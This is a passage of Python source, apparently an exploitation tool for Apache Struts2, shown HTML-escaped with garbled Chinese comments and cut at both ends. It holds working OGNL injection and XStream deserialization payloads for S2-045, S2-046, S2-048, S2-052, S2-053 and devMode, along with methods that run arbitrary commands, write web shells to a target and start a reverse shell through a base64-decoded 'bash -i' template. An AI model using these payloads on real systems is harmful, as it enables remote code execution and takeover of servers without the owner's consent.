r&quot;&quot;&quot;%&#123;(#fuck=&#x27;multipart/form-data&#x27;).(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context[&#x27;com.opensymphony.xwork2.ActionContext.container&#x27;]).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#req=@org.apache.struts2.ServletActionContext@getRequest()).(#outstr=@org.apache.struts2.ServletActionContext@getResponse().getWriter()).(#outstr.println(#req.getRealPath(&quot;/&quot;))).(#outstr.close()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())&#125;&quot;&quot;&quot;</span><br><span class="line">    exec_payload = r&quot;&quot;&quot;%&#123;(#fuck=&#x27;multipart/form-data&#x27;).(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context[&#x27;com.opensymphony.xwork2.ActionContext.container&#x27;]).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd=&#x27;CMD&#x27;).(#iswin=(@java.lang.System@getProperty(&#x27;os.name&#x27;).toLowerCase().contains(&#x27;win&#x27;))).(#cmds=(#iswin?&#123;&#x27;cmd.exe&#x27;,&#x27;/c&#x27;,#cmd&#125;:&#123;&#x27;/bin/bash&#x27;,&#x27;-c&#x27;,#cmd&#125;)).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())&#125;&quot;&quot;&quot;</span><br><span class="line">    upload_payload = r&quot;&quot;&quot;%&#123;(#fuck=&#x27;multipart/form-data&#x27;).(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context[&#x27;com.opensymphony.xwork2.ActionContext.container&#x27;]).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#req=@org.apache.struts2.ServletActionContext@getRequest()).(#fos= new java.io.FileOutputStream(#req.getParameter(&quot;f&quot;)),#fos.write(#req.getParameter(&quot;t&quot;).getBytes()),#fos.close()).(#outstr=@org.apache.struts2.ServletActionContext@getResponse().getWriter()).(#outstr.println(&quot;OK&quot;),(#outstr.close()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())))&#125;&quot;&quot;&quot;</span><br><span class="line">    shell = &quot;&#123;echo,SHELL&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;</span><br><span class="line"> </span><br><span class="line">    def __init__(self, url, data=None, headers=None, encoding=&quot;UTF-8&quot;):</span><br><span class="line">        self.url = url</span><br><span class="line">        self.headers = parse_headers(headers)</span><br><span class="line">        self.encoding = encoding</span><br><span class="line">        self.data = data</span><br><span class="line">        self.is_vul = False</span><br><span class="line"> </span><br><span class="line">    def check(self):</span><br><span class="line">        &quot;&quot;&quot;æ£€æµ‹æ¼æ´æ˜¯å¦å­˜åœ¨&quot;&quot;&quot;</span><br><span class="line">        html = echo_check(self)</span><br><span class="line">        if str(html).startswith(&quot;ERROR:&quot;):</span><br><span class="line">            return html</span><br><span class="line">        if html:</span><br><span class="line">            self.is_vul = True</span><br><span class="line">            return &#x27;S2-045&#x27;</span><br><span class="line">        return self.is_vul</span><br><span class="line"> </span><br><span class="line">    def get_path(self):</span><br><span class="line">        &quot;&quot;&quot;è·å–webç›®å½•&quot;&quot;&quot;</span><br><span class="line">        self.headers[&#x27;Content-Type&#x27;] = self.web_path</span><br><span class="line">        html = post(self.url, self.data, self.headers, self.encoding)</span><br><span class="line">        return html</span><br><span class="line"> </span><br><span class="line">    def exec_cmd(self, cmd):</span><br><span class="line">        &quot;&quot;&quot;æ‰§è¡Œå‘½ä»¤&quot;&quot;&quot;</span><br><span class="line">        self.headers[&#x27;Content-Type&#x27;] = self.exec_payload.replace(&#x27;CMD&#x27;, cmd)</span><br><span class="line">        html = post_stream(self.url, self.data, self.headers, self.encoding)</span><br><span class="line">        return html</span><br><span class="line"> </span><br><span class="line">    def reverse_shell(self, ip, port):</span><br><span class="line">        &quot;&quot;&quot;åå¼¹shell&quot;&quot;&quot;</span><br><span class="line">        html = reverse_shell(self, ip, port)</span><br><span class="line">        return html</span><br><span class="line"> </span><br><span class="line">    def upload_shell(self, upload_path, shell_path):</span><br><span class="line">        shell = read_file(shell_path, self.encoding)</span><br><span class="line">        data = &quot;?t=&#123;shell&#125;&amp;f=&#123;path&#125;&quot;.format(shell=quote(shell), path=upload_path)</span><br><span class="line">        self.headers[&#x27;Content-Type&#x27;] = self.upload_payload</span><br><span class="line">        html = post(self.url + data, self.data, self.headers, self.encoding)</span><br><span class="line">        if html == &#x27;OK&#x27;:</span><br><span class="line">            return True</span><br><span class="line">        else:</span><br><span class="line">            return False</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">class S2_046:</span><br><span class="line">    &quot;&quot;&quot;S2-046æ¼æ´æ£€æµ‹åˆ©ç”¨ç±»&quot;&quot;&quot;</span><br><span class="line">    info = &quot;[+] S2-046:å½±å“ç‰ˆæœ¬Struts 2.3.5-2.3.31,2.5-2.5.10; POSTè¯·æ±‚å‘é€æ•°æ®,ä¸éœ€è¦å‚æ•°; æ”¯æŒè·å–WEBè·¯å¾„,ä»»æ„å‘½ä»¤æ‰§è¡Œ,åå¼¹shellå’Œæ–‡ä»¶ä¸Šä¼ &quot;</span><br><span class="line">    web_path = &quot;%&#123;(#test=&#x27;multipart/form-data&#x27;).(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context[&#x27;com.opensymphony.xwork2.ActionContext.container&#x27;]).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#req=@org.apache.struts2.ServletActionContext@getRequest()).(#res=@org.apache.struts2.ServletActionContext@getResponse()).(#res.setContentType(&#x27;text/html;charset=ENCODING&#x27;)).(#res.getWriter().print(&#x27;&#x27;)).(#res.getWriter().print(&#x27;&#x27;)).(#res.getWriter().print(#req.getSession().getServletContext().getRealPath(&#x27;/&#x27;))).(#res.getWriter().flush()).(#res.getWriter().close())&#125;\0b&quot;</span><br><span class="line">    check_poc = &quot;%&#123;(#test=&#x27;multipart/form-data&#x27;).(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context[&#x27;com.opensymphony.xwork2.ActionContext.container&#x27;]).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#req=@org.apache.struts2.ServletActionContext@getRequest()).(#res=@org.apache.struts2.ServletActionContext@getResponse()).(#res.setContentType(&#x27;text/html;charset=ENCODING&#x27;)).(#res.getWriter().print(&#x27;security_&#x27;)).(#res.getWriter().print(&#x27;check&#x27;)).(#res.getWriter().flush()).(#res.getWriter().close())&#125;\0b&quot;</span><br><span class="line">    exec_payload = &quot;%&#123;(#test=&#x27;multipart/form-data&#x27;).(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context[&#x27;com.opensymphony.xwork2.ActionContext.container&#x27;]).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#req=@org.apache.struts2.ServletActionContext@getRequest()).(#res=@org.apache.struts2.ServletActionContext@getResponse()).(#res.setContentType(&#x27;text/html;charset=ENCODING&#x27;)).(#s=new java.util.Scanner((new java.lang.ProcessBuilder(&#x27;CMD&#x27;.toString().split(&#x27;\\\\s&#x27;))).start().getInputStream()).useDelimiter(&#x27;\\\\AAAA&#x27;)).(#str=#s.hasNext()?#s.next():&#x27;&#x27;).(#res.getWriter().print(#str)).(#res.getWriter().flush()).(#res.getWriter().close()).(#s.close())&#125;\0b&quot;</span><br><span class="line">    upload_paylaod = &quot;%&#123;(#test=&#x27;multipart/form-data&#x27;).(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context[&#x27;com.opensymphony.xwork2.ActionContext.container&#x27;]).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#req=@org.apache.struts2.ServletActionContext@getRequest()).(#res=@org.apache.struts2.ServletActionContext@getResponse()).(#res.setContentType(&#x27;text/html;charset=ENCODING&#x27;)).(#filecontent=&#x27;SHELL&#x27;).(new java.io.BufferedWriter(new java.io.FileWriter(&#x27;PATH&#x27;)).append(new java.net.URLDecoder().decode(#filecontent,&#x27;ENCODING&#x27;)).close()).(#res.getWriter().print(&#x27;O&#x27;)).(#res.getWriter().print(&#x27;K&#x27;)).(#res.getWriter().print(#req.getContextPath())).(#res.getWriter().flush()).(#res.getWriter().close())&#125;\0b&quot;</span><br><span class="line">    shell = &quot;bash -c &#123;echo,SHELL&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;</span><br><span class="line"> </span><br><span class="line">    def __init__(self, url, data=None, headers=None, encoding=&quot;UTF-8&quot;):</span><br><span class="line">        self.url = url</span><br><span class="line">        self.headers = parse_headers(headers)</span><br><span class="line">        self.encoding = encoding</span><br><span class="line">        self.is_vul = False</span><br><span class="line"> </span><br><span class="line">    def check(self):</span><br><span class="line">        &quot;&quot;&quot;æ£€æµ‹æ¼æ´æ˜¯å¦å­˜åœ¨&quot;&quot;&quot;</span><br><span class="line">        files = &#123;&#x27;test&#x27;: (self.check_poc.replace(&#x27;ENCODING&#x27;, self.encoding), b&#x27;x&#x27;, &#x27;text/plain&#x27;)&#125;</span><br><span class="line">        html = post(self.url, files=files, encoding=self.encoding)</span><br><span class="line">        if html.startswith(&quot;ERROR:&quot;):</span><br><span class="line">            return html</span><br><span class="line">        elif html == &#x27;security_check&#x27;:</span><br><span class="line">            self.is_vul = True</span><br><span class="line">            return &#x27;S2-046&#x27;</span><br><span class="line">        return self.is_vul</span><br><span class="line"> </span><br><span class="line">    def get_path(self):</span><br><span class="line">        &quot;&quot;&quot;è·å–webç›®å½•&quot;&quot;&quot;</span><br><span class="line">        files = &#123;&#x27;test&#x27;: (self.web_path.replace(&#x27;ENCODING&#x27;, self.encoding), b&#x27;x&#x27;, &#x27;text/plain&#x27;)&#125;</span><br><span class="line">        html = post(self.url, files=files, encoding=self.encoding)</span><br><span class="line">        return html</span><br><span class="line"> </span><br><span class="line">    def exec_cmd(self, cmd):</span><br><span class="line">        &quot;&quot;&quot;æ‰§è¡Œå‘½ä»¤&quot;&quot;&quot;</span><br><span class="line">        paylaod = self.exec_payload.replace(&#x27;CMD&#x27;, cmd).replace(&#x27;ENCODING&#x27;, self.encoding)</span><br><span class="line">        html = post_file(self.url, paylaod, self.headers, self.encoding)</span><br><span class="line">        return html</span><br><span class="line"> </span><br><span class="line">    def reverse_shell(self, ip, port):</span><br><span class="line">        &quot;&quot;&quot;åå¼¹shell&quot;&quot;&quot;</span><br><span class="line">        html = reverse_shell(self, ip, port)</span><br><span class="line">        return html</span><br><span class="line"> </span><br><span class="line">    def upload_shell(self, upload_path, shell_path):</span><br><span class="line">        shell = read_file(shell_path, self.encoding)</span><br><span class="line">        files = &#123;&#x27;test&#x27;: (</span><br><span class="line">            self.upload_paylaod.replace(&#x27;SHELL&#x27;, quote(shell)).replace(&#x27;PATH&#x27;, upload_path).replace(&#x27;ENCODING&#x27;,</span><br><span class="line">                                                                                                    self.encoding),</span><br><span class="line">            b&#x27;x&#x27;,</span><br><span class="line">            &#x27;text/plain&#x27;)&#125;</span><br><span class="line">        html = post(self.url, files=files, encoding=self.encoding)</span><br><span class="line">        if html == &#x27;OK&#x27;:</span><br><span class="line">            return True</span><br><span class="line">        else:</span><br><span class="line">            return False</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">class S2_048:</span><br><span class="line">    &quot;&quot;&quot;S2-048æ¼æ´æ£€æµ‹åˆ©ç”¨ç±»&quot;&quot;&quot;</span><br><span class="line">    info = &quot;[+] S2-048:å½±å“ç‰ˆæœ¬Struts 2.3.x with Struts 1 plugin and Struts 1 action; POSTè¯·æ±‚å‘é€æ•°æ®; é»˜è®¤å‚æ•°ä¸º:username,password; æ”¯æŒä»»æ„å‘½ä»¤æ‰§è¡Œå’Œåå¼¹shell&quot;</span><br><span class="line">    check_poc = &quot;%24%7B&#123;num1&#125;%2B&#123;num2&#125;%7D&quot;</span><br><span class="line">    exec_payload = &quot;%25%7B(%23dm%3D%40ognl.OgnlContext%40DEFAULT_MEMBER_ACCESS).(%23_memberAccess%3F(%23_memberAccess%3D%23dm)%3A((%23container%3D%23context%5B&#x27;com.opensymphony.xwork2.ActionContext.container&#x27;%5D).(%23ognlUtil%3D%23container.getInstance(%40com.opensymphony.xwork2.ognl.OgnlUtil%40class)).(%23ognlUtil.getExcludedPackageNames().clear()).(%23ognlUtil.getExcludedClasses().clear()).(%23context.setMemberAccess(%23dm)))).(%23q%3D%40org.apache.commons.io.IOUtils%40toString(%40java.lang.Runtime%40getRuntime().exec(&#x27;&#123;cmd&#125;&#x27;).getInputStream())).(%23q)%7D&quot;</span><br><span class="line">    shell = &quot;bash -c &#123;echo,SHELL&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;</span><br><span class="line"> </span><br><span class="line">    def __init__(self, url, data=None, headers=None, encoding=&quot;UTF-8&quot;):</span><br><span class="line">        self.url = url</span><br><span class="line">        if not data:</span><br><span class="line">            self.data = &quot;username=test&amp;password=&#123;exp&#125;&quot;</span><br><span class="line">        else:</span><br><span class="line">            self.data = data</span><br><span class="line">        self.headers = parse_headers(headers)</span><br><span class="line">        self.encoding = encoding</span><br><span class="line">        self.is_vul = False</span><br><span class="line">        if &#x27;Content-Type&#x27; not in self.headers:</span><br><span class="line">            self.headers[&#x27;Content-Type&#x27;] = &#x27;application/x-www-form-urlencoded&#x27;</span><br><span class="line"> </span><br><span class="line">    def check(self):</span><br><span class="line">        &quot;&quot;&quot;æ£€æµ‹æ¼æ´æ˜¯å¦å­˜åœ¨&quot;&quot;&quot;</span><br><span class="line">        num1 = random.randint(10000, 100000)</span><br><span class="line">        num2 = random.randint(10000, 100000)</span><br><span class="line">        poc = self.check_poc.format(num1=num1, num2=num2)</span><br><span class="line">        data = self.data.format(exp=poc)</span><br><span class="line">        html = post_stream(self.url, data, self.headers, self.encoding)</span><br><span class="line">        nn = str(num1 + num2)</span><br><span class="line">        if html.startswith(&quot;ERROR:&quot;):</span><br><span class="line">            return html</span><br><span class="line">        elif nn in html:</span><br><span class="line">            self.is_vul = True</span><br><span class="line">            return &#x27;S2-048&#x27;</span><br><span class="line">        return self.is_vul</span><br><span class="line"> </span><br><span class="line">    def exec_cmd(self, cmd):</span><br><span class="line">        &quot;&quot;&quot;æ‰§è¡Œå‘½ä»¤&quot;&quot;&quot;</span><br><span class="line">        data = self.data.format(exp=self.exec_payload.format(cmd=quote(cmd)))</span><br><span class="line">        html = post(self.url, data, self.headers, self.encoding)</span><br><span class="line">        return html</span><br><span class="line"> </span><br><span class="line">    def reverse_shell(self, ip, port):</span><br><span class="line">        &quot;&quot;&quot;åå¼¹shell&quot;&quot;&quot;</span><br><span class="line">        html = reverse_shell(self, ip, port)</span><br><span class="line">        return html</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">class S2_052:</span><br><span class="line">    &quot;&quot;&quot;S2-052æ¼æ´æ£€æµ‹åˆ©ç”¨ç±»&quot;&quot;&quot;</span><br><span class="line">    info = &quot;[+] S2-052:å½±å“ç‰ˆæœ¬Struts 2.1.2-2.3.33,2.5-2.5.12; POSTè¯·æ±‚å‘é€æ•°æ®,ä¸éœ€è¦å‚æ•°; æ”¯æŒä»»æ„å‘½ä»¤æ‰§è¡Œ(æ— å›æ˜¾)å’Œåå¼¹shell,ä¸æ”¯æŒæ£€æµ‹è¯¥æ¼æ´æ˜¯å¦å­˜åœ¨&quot;</span><br><span class="line">    exec_payload = &quot;&quot;&quot;&lt;map&gt;</span><br><span class="line">  &lt;entry&gt;</span><br><span class="line">    &lt;jdk.nashorn.internal.objects.NativeString&gt;</span><br><span class="line">      &lt;flags&gt;0&lt;/flags&gt;</span><br><span class="line">      &lt;value class=&quot;com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data&quot;&gt;</span><br><span class="line">        &lt;dataHandler&gt;</span><br><span class="line">          &lt;dataSource class=&quot;com.sun.xml.internal.ws.encoding.xml.XMLMessage$XmlDataSource&quot;&gt;</span><br><span class="line">            &lt;is class=&quot;javax.crypto.CipherInputStream&quot;&gt;</span><br><span class="line">              &lt;cipher class=&quot;javax.crypto.NullCipher&quot;&gt;</span><br><span class="line">                &lt;initialized&gt;false&lt;/initialized&gt;</span><br><span class="line">                &lt;opmode&gt;0&lt;/opmode&gt;</span><br><span class="line">                &lt;serviceIterator class=&quot;javax.imageio.spi.FilterIterator&quot;&gt;</span><br><span class="line">                  &lt;iter class=&quot;javax.imageio.spi.FilterIterator&quot;&gt;</span><br><span class="line">                    &lt;iter class=&quot;java.util.Collections$EmptyIterator&quot;/&gt;</span><br><span class="line">                    &lt;next class=&quot;java.lang.ProcessBuilder&quot;&gt;</span><br><span class="line">                      &lt;command&gt;</span><br><span class="line">                        &#123;cmd&#125;</span><br><span class="line">                      &lt;/command&gt;</span><br><span class="line">                      &lt;redirectErrorStream&gt;false&lt;/redirectErrorStream&gt;</span><br><span class="line">                    &lt;/next&gt;</span><br><span class="line">                  &lt;/iter&gt;</span><br><span class="line">                  &lt;filter class=&quot;javax.imageio.ImageIO$ContainsFilter&quot;&gt;</span><br><span class="line">                    &lt;method&gt;</span><br><span class="line">                      &lt;class&gt;java.lang.ProcessBuilder&lt;/class&gt;</span><br><span class="line">                      &lt;name&gt;start&lt;/name&gt;</span><br><span class="line">                      &lt;parameter-types/&gt;</span><br><span class="line">                    &lt;/method&gt;</span><br><span class="line">                    &lt;name&gt;foo&lt;/name&gt;</span><br><span class="line">                  &lt;/filter&gt;</span><br><span class="line">                  &lt;next class=&quot;string&quot;&gt;foo&lt;/next&gt;</span><br><span class="line">                &lt;/serviceIterator&gt;</span><br><span class="line">                &lt;lock/&gt;</span><br><span class="line">              &lt;/cipher&gt;</span><br><span class="line">              &lt;input class=&quot;java.lang.ProcessBuilder$NullInputStream&quot;/&gt;</span><br><span class="line">              &lt;ibuffer&gt;&lt;/ibuffer&gt;</span><br><span class="line">              &lt;done&gt;false&lt;/done&gt;</span><br><span class="line">              &lt;ostart&gt;0&lt;/ostart&gt;</span><br><span class="line">              &lt;ofinish&gt;0&lt;/ofinish&gt;</span><br><span class="line">              &lt;closed&gt;false&lt;/closed&gt;</span><br><span class="line">            &lt;/is&gt;</span><br><span class="line">            &lt;consumed&gt;false&lt;/consumed&gt;</span><br><span class="line">          &lt;/dataSource&gt;</span><br><span class="line">          &lt;transferFlavors/&gt;</span><br><span class="line">        &lt;/dataHandler&gt;</span><br><span class="line">        &lt;dataLen&gt;0&lt;/dataLen&gt;</span><br><span class="line">      &lt;/value&gt;</span><br><span class="line">    &lt;/jdk.nashorn.internal.objects.NativeString&gt;</span><br><span class="line">    &lt;jdk.nashorn.internal.objects.NativeString reference=&quot;../jdk.nashorn.internal.objects.NativeString&quot;/&gt;</span><br><span class="line">  &lt;/entry&gt;</span><br><span class="line">  &lt;entry&gt;</span><br><span class="line">    &lt;jdk.nashorn.internal.objects.NativeString reference=&quot;../../entry/jdk.nashorn.internal.objects.NativeString&quot;/&gt;</span><br><span class="line">    &lt;jdk.nashorn.internal.objects.NativeString reference=&quot;../../entry/jdk.nashorn.internal.objects.NativeString&quot;/&gt;</span><br><span class="line">  &lt;/entry&gt;</span><br><span class="line">&lt;/map&gt;&quot;&quot;&quot;</span><br><span class="line">    shell = &quot;bash -c &#123;echo,SHELL&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;</span><br><span class="line"> </span><br><span class="line">    def __init__(self, url, data=None, headers=None, encoding=&quot;UTF-8&quot;):</span><br><span class="line">        self.url = url</span><br><span class="line">        self.headers = parse_headers(headers)</span><br><span class="line">        self.encoding = encoding</span><br><span class="line">        self.is_vul = False</span><br><span class="line">        if &#x27;Content-Type&#x27; not in self.headers:</span><br><span class="line">            self.headers[&#x27;Content-Type&#x27;] = &#x27;application/xml&#x27;</span><br><span class="line"> </span><br><span class="line">    def exec_cmd(self, cmd):</span><br><span class="line">        &quot;&quot;&quot;æ‰§è¡Œå‘½ä»¤&quot;&quot;&quot;</span><br><span class="line">        cmd = parse_cmd(cmd, type=&#x27;xml&#x27;)</span><br><span class="line">        data = self.exec_payload.format(cmd=cmd)</span><br><span class="line">        html = post(self.url, data, self.headers, self.encoding)</span><br><span class="line">        return html</span><br><span class="line"> </span><br><span class="line">    def reverse_shell(self, ip, port):</span><br><span class="line">        &quot;&quot;&quot;åå¼¹shell&quot;&quot;&quot;</span><br><span class="line">        html = reverse_shell(self, ip, port)</span><br><span class="line">        return html</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">class S2_053:</span><br><span class="line">    &quot;&quot;&quot;S2-053æ¼æ´æ£€æµ‹åˆ©ç”¨ç±»&quot;&quot;&quot;</span><br><span class="line">    info = &quot;[+] S2-053:å½±å“ç‰ˆæœ¬Struts 2.0.1-2.3.33,2.5-2.5.10; POSTè¯·æ±‚å‘é€æ•°æ®; é»˜è®¤å‚æ•°ä¸º:username,password; æ”¯æŒä»»æ„å‘½ä»¤æ‰§è¡Œå’Œåå¼¹shell&quot;</span><br><span class="line">    check_poc = &quot;%25%7B&#123;num1&#125;%2B&#123;num2&#125;%7D&quot;</span><br><span class="line">    exec_payload = &quot;%25%7B(%23dm%3D%40ognl.OgnlContext%40DEFAULT_MEMBER_ACCESS).(%23_memberAccess%3F(%23_memberAccess%3D%23dm)%3A((%23container%3D%23context%5B&#x27;com.opensymphony.xwork2.ActionContext.container&#x27;%5D).(%23ognlUtil%3D%23container.getInstance(%40com.opensymphony.xwork2.ognl.OgnlUtil%40class)).(%23ognlUtil.getExcludedPackageNames().clear()).(%23ognlUtil.getExcludedClasses().clear()).(%23context.setMemberAccess(%23dm)))).(%23cmd%3D&#x27;&#123;cmd&#125;&#x27;).(%23iswin%3D(%40java.lang.System%40getProperty(&#x27;os.name&#x27;).toLowerCase().contains(&#x27;win&#x27;))).(%23cmds%3D(%23iswin%3F%7B&#x27;cmd.exe&#x27;%2C&#x27;%2Fc&#x27;%2C%23cmd%7D%3A%7B&#x27;%2Fbin%2Fbash&#x27;%2C&#x27;-c&#x27;%2C%23cmd%7D)).(%23p%3Dnew%20java.lang.ProcessBuilder(%23cmds)).(%23p.redirectErrorStream(true)).(%23process%3D%23p.start()).(%40org.apache.commons.io.IOUtils%40toString(%23process.getInputStream()))%7D%0A&quot;</span><br><span class="line">    shell = &quot;&#123;echo,SHELL&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;</span><br><span class="line"> </span><br><span class="line">    def __init__(self, url, data=None, headers=None, encoding=&quot;UTF-8&quot;):</span><br><span class="line">        self.url = url</span><br><span class="line">        if not data:</span><br><span class="line">            self.data = &quot;username=test&amp;password=&#123;exp&#125;&quot;</span><br><span class="line">        else:</span><br><span class="line">            self.data = data</span><br><span class="line">        self.headers = parse_headers(headers)</span><br><span class="line">        self.encoding = encoding</span><br><span class="line">        self.is_vul = False</span><br><span class="line">        if &#x27;Content-Type&#x27; not in self.headers:</span><br><span class="line">            self.headers[&#x27;Content-Type&#x27;] = &#x27;application/x-www-form-urlencoded&#x27;</span><br><span class="line"> </span><br><span class="line">    def check(self):</span><br><span class="line">        &quot;&quot;&quot;æ£€æµ‹æ¼æ´æ˜¯å¦å­˜åœ¨&quot;&quot;&quot;</span><br><span class="line">        num1 = random.randint(10000, 100000)</span><br><span class="line">        num2 = random.randint(10000, 100000)</span><br><span class="line">        poc = self.check_poc.format(num1=num1, num2=num2)</span><br><span class="line">        data = self.data.format(exp=poc)</span><br><span class="line">        html = post_stream(self.url, data, self.headers, self.encoding)</span><br><span class="line">        nn = str(num1 + num2)</span><br><span class="line">        if html.startswith(&quot;ERROR:&quot;):</span><br><span class="line">            return html</span><br><span class="line">        elif nn in html:</span><br><span class="line">            self.is_vul = True</span><br><span class="line">            return &#x27;S2-053&#x27;</span><br><span class="line">        return self.is_vul</span><br><span class="line"> </span><br><span class="line">    def exec_cmd(self, cmd):</span><br><span class="line">        &quot;&quot;&quot;æ‰§è¡Œå‘½ä»¤&quot;&quot;&quot;</span><br><span class="line">        data = self.data.format(exp=self.exec_payload.format(cmd=quote(cmd)))</span><br><span class="line">        html = post(self.url, data, self.headers, self.encoding)</span><br><span class="line">        return html</span><br><span class="line"> </span><br><span class="line">    def reverse_shell(self, ip, port):</span><br><span class="line">        &quot;&quot;&quot;åå¼¹shell&quot;&quot;&quot;</span><br><span class="line">        html = reverse_shell(self, ip, port)</span><br><span class="line">        return html</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">class S2_devMode:</span><br><span class="line">    &quot;&quot;&quot;S2-devModeæ¼æ´æ£€æµ‹åˆ©ç”¨ç±»&quot;&quot;&quot;</span><br><span class="line">    info = &quot;[+] S2-devMode:å½±å“ç‰ˆæœ¬Struts 2.1.0-2.3.1; GETè¯·æ±‚å‘é€æ•°æ®; æ”¯æŒè·å–WEBè·¯å¾„,ä»»æ„å‘½ä»¤æ‰§è¡Œå’Œåå¼¹shell&quot;</span><br><span class="line">    web_path = &quot;?debug=browser&amp;object=(%23_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)%3f(%23context%5B%23parameters.rpsobj%5B0%5D%5D.getWriter().println(%23context%5B%23parameters.reqobj%5B0%5D%5D.getRealPath(%23parameters.pp%5B0%5D))):sb.toString.json&amp;rpsobj=com.opensymphony.xwork2.dispatcher.HttpServletResponse&amp;command=Is-Struts2-Vul-URL&amp;pp=%2f&amp;reqobj=com.opensymphony.xwork2.dispatcher.HttpServletRequest&quot;</span><br><span class="line">    exec_payload = &quot;?debug=browser&amp;object=(%23_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)%3f(%23context%5B%23parameters.rpsobj%5B0%5D%5D.getWriter().println(@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(%23parameters.command%5B0%5D).getInputStream()))):sb.toString.json&amp;rpsobj=com.opensymphony.xwork2.dispatcher.HttpServletResponse&amp;command=&#123;cmd&#125;&quot;</span><br><span class="line">    shell = &quot;bash -c &#123;echo,SHELL&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;</span><br><span class="line"> </span><br><span class="line">    def __init__(self, url, data=None, headers=None, encoding=&quot;UTF-8&quot;):</span><br><span class="line">        self.url = url</span><br><span class="line">        self.headers = parse_headers(headers)</span><br><span class="line">        self.encoding = encoding</span><br><span class="line">        self.is_vul = False</span><br><span class="line"> </span><br><span class="line">    def check(self):</span><br><span class="line">        &quot;&quot;&quot;æ£€æµ‹æ¼æ´æ˜¯å¦å­˜åœ¨&quot;&quot;&quot;</span><br><span class="line">        html = echo_check(self)</span><br><span class="line">        if str(html).startswith(&quot;ERROR:&quot;):</span><br><span class="line">            return html</span><br><span class="line">        if html:</span><br><span class="line">            self.is_vul = True</span><br><span class="line">            return &#x27;S2-devMode&#x27;</span><br><span class="line">        return self.is_vul</span><br><span class="line"> </span><br><span class="line">    def get_path(self):</span><br><span class="line">        &quot;&quot;&quot;è·å–webç›®å½•&quot;&quot;&quot;</span><br><span class="line">        html = get(self.url + self.web_path, self.headers, self.encoding)</span><br><span class="line">        return html</span><br><span class="line"> </span><br><span class="line">    def exec_cmd(self, cmd):</span><br><span class="line">        &quot;&quot;&quot;æ‰§è¡Œå‘½ä»¤&quot;&quot;&quot;</span><br><span class="line">        html = get_stream(self.url + self.exec_payload.format(cmd=quote(cmd)), self.headers, self.encoding)</span><br><span class="line">        return html</span><br><span class="line"> </span><br><span class="line">    def reverse_shell(self, ip, port):</span><br><span class="line">        &quot;&quot;&quot;åå¼¹shell&quot;&quot;&quot;</span><br><span class="line">        html = reverse_shell(self, ip, port)</span><br><span class="line">        return html</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">class S2_057:</span><br><span class="line">    &quot;&quot;&quot;S2-057æ¼æ´æ£€æµ‹åˆ©ç”¨ç±»&quot;&quot;&quot;</span><br><span class="line">    info = &quot;[+] S2-057:å½±å“ç‰ˆæœ¬Struts 2.0.4-2.3.34, Struts 2.5.0-2.5.16; GETè¯·æ±‚å‘é€æ•°æ®; 